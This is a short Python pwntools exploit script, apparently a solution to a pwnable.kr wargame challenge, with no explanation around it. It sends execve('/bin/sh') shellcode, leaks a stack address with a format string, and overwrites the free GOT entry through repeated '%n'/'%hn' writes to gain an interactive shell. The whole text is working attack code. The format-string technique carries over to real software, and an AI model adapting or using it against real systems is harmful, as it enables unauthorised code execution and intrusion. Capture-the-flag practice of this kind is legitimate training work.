from pwn import *
r = remote('pwnable.kr', 9011)

free_got = 0x602000 #got overwrite (to name_addr)
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

print r.recvuntil(': ')
r.sendline(shellcode)

print r.recvuntil('> ')
r.sendline('2')
r.sendline('%10$p')

print r.recvline() #hello

name_addr = int(r.recvline(), 16) - 0x20
print(hex(name_addr))

for i in range(0, 3):
	print r.recvuntil('> ')
	r.sendline('2')
	r.sendline('%{}x%10$n'.format(free_got + i * 2))
	print r.recvuntil('> ')
	r.sendline('2')
	r.sendline('%{}x%18$hn'.format(name_addr & 0xffff))
	name_addr >>= 16

r.sendline('3')
r.sendline('plz shell')
r.interactive()
